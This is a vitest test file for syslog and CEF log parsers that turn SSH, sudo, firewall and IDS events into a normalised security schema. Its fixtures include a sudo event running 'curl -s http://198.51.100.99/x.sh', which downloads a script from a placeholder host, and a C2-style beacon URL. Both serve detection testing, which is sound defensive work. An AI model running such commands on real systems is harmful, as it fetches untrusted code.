import { describe, expect, it } from "vitest";
import { assertSchemaValid, ctx, fixtureText } from "../test-support/fixtures.js";
import { cefSeverity, createCefAdapter, createSyslogAdapter, matchLinuxAuth, parseCef, parseSyslog } from "./syslog.js";

describe("syslog parser", () => {
  it("parses RFC 5424 with structured data", () => {
    const m = parseSyslog('<165>1 2026-10-07T10:50:01.003Z fw-edge-01 sshd 2201 ID47 [origin@32473 ip="10.0.0.1" note="a \\"quoted\\" \\]"] hello world');
    expect(m).toMatchObject({ format: "rfc5424", facility: 20, severity: 5, hostname: "fw-edge-01", appName: "sshd", procId: "2201", msgId: "ID47", message: "hello world" });
    expect(m.timestamp).toBe("2026-10-07T10:50:01.003Z");
    expect(m.structuredData).toEqual({ "origin@32473": { ip: "10.0.0.1", note: 'a "quoted" ]' } });
  });

  it("parses RFC 3164, inferring the year from the receive time", () => {
    const m = parseSyslog("<38>Oct  7 10:50:02 web-01 sshd[22901]: Accepted publickey for ubuntu", new Date("2026-10-07T12:00:00Z"));
    expect(m).toMatchObject({ format: "rfc3164", facility: 4, severity: 6, hostname: "web-01", appName: "sshd", procId: "22901", timestamp: "2026-10-07T10:50:02.000Z" });
    const newYear = parseSyslog("Dec 31 23:59:59 h app: x", new Date("2027-01-01T00:00:30Z"));
    expect(newYear.timestamp).toBe("2026-12-31T23:59:59.000Z");
  });

  it("recognises Linux auth messages", () => {
    expect(matchLinuxAuth("sshd", "Failed password for invalid user deploy from 203.0.113.45 port 60122 ssh2")).toMatchObject({ outcome: "failure", user: "deploy", srcIp: "203.0.113.45", srcPort: 60122 });
    expect(matchLinuxAuth("sudo", "  ubuntu : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/ls")).toMatchObject({ kind: "sudo", outcome: "success", user: "ubuntu", command: "/bin/ls" });
    expect(matchLinuxAuth("kernel", "EXT4-fs mounted")).toBeUndefined();
  });
});

describe("CEF parser", () => {
  it("handles escaped pipes in the header and escaped = / newlines in extension values", () => {
    const cef = parseCef("CEF:0|Ven\\|dor|Prod|1.0|100|Name with = sign|7|msg=a\\=b c\\nd src=10.0.0.1 cs1Label=policy cs1=allow all");
    expect(cef).toMatchObject({ vendor: "Ven|dor", product: "Prod", signatureId: "100", name: "Name with = sign", severity: "7" });
    expect(cef?.extensions).toEqual({ msg: "a=b c\nd", src: "10.0.0.1", cs1Label: "policy", cs1: "allow all" });
    expect(parseCef("CEF:0|too|short")).toBeUndefined();
  });

  it("severity scale (numeric and words)", () => {
    expect(["0", "3", "5", "8", "10", "Very-High", "Low", "Unknown"].map(cefSeverity)).toEqual(["info", "low", "medium", "high", "critical", "critical", "low", "info"]);
  });
});

describe("syslog & CEF adapters", () => {
  const sys = createSyslogAdapter().normalizeDetailed(fixtureText("syslog/messages.log"), ctx());

  it("syslog adapter maps every line (CEF payloads included)", () => {
    expect(sys.events.map((e) => e.eventType)).toEqual([
      "syslog.ssh_auth_failure",
      "syslog.ssh_auth_success",
      "syslog.sudo_command",
      "cef.acme_networks.edgewall",
      "cef.bloody_labs.sensorx",
      "syslog.kernel",
    ]);
    assertSchemaValid(sys.events);
  });

  it("auth failures carry identity, source IP, T1110; sudo is a privileged process event", () => {
    const fail = sys.events[0];
    expect(fail?.identity).toMatchObject({ provider: "ssh", principal: "deploy", sourceIp: "203.0.113.45", outcome: "failure" });
    expect(fail?.attack[0]?.id).toBe("T1110");
    // label keys are sanitized to [A-Za-z0-9_.:-]
    expect(fail?.labels["sd.origin_32473.software"]).toBe("openssh");
    const sudo = sys.events[2];
    expect(sudo?.process?.commandLine).toBe("/usr/bin/curl -s http://198.51.100.99/x.sh");
    expect(sudo?.identity).toMatchObject({ privileged: true });
  });

  it("CEF over syslog: header host/time, extension mapping, cs labels, direction", () => {
    const fw = sys.events[3];
    expect(fw?.timestamp).toBe("2026-10-07T10:50:04.000Z");
    expect(fw?.asset?.hostname).toBe("fw-edge-01");
    expect(fw?.severity).toBe("medium");
    expect(fw?.outcome).toBe("failure");
    expect(fw?.network).toMatchObject({ srcIp: "203.0.113.45", srcPort: 60122, dstIp: "10.0.1.15", dstPort: 3389, direction: "inbound" });
    expect(fw?.labels).toMatchObject({ "cef.policy": "block-rdp-inbound", "cef.vendor": "Acme Networks", "cef.signature_id": "deny-1001" });
    expect(fw?.source).toMatchObject({ product: "edgewall", vendor: "Acme Networks" });
  });

  it("bare CEF: http category, URL/hash indicators, receive-time fallback is labelled", () => {
    const ids = sys.events[4];
    expect(ids?.category).toBe("http");
    expect(ids?.severity).toBe("critical");
    expect(ids?.network?.httpUrl).toBe("https://cdn-update.badcdn.net/submit.php?id=42");
    expect(ids?.indicators.map((i) => i.type).sort()).toEqual(["ip", "sha256", "url"]);
    expect(ids?.message).toBe("Beacon check-in\nsecond line");
    expect(ids?.labels["timestamp_source"]).toBe("received_at");
  });

  it("cef adapter only accepts CEF lines", () => {
    const r = createCefAdapter().normalizeDetailed(fixtureText("syslog/messages.log"), ctx());
    expect(r.events).toHaveLength(2);
    expect(r.skipped.every((s) => s.reason === "line is not CEF")).toBe(true);
  });

  it("accepts arrays of strings and JSON envelopes with a message field", () => {
    const r = createSyslogAdapter().normalizeDetailed([{ message: "<13>Oct  7 10:00:00 h app: hello" }, "<13>Oct  7 10:00:01 h app: world", { nope: 1 }], ctx());
    expect(r.events).toHaveLength(2);
    expect(r.rejected).toHaveLength(1);
  });
});
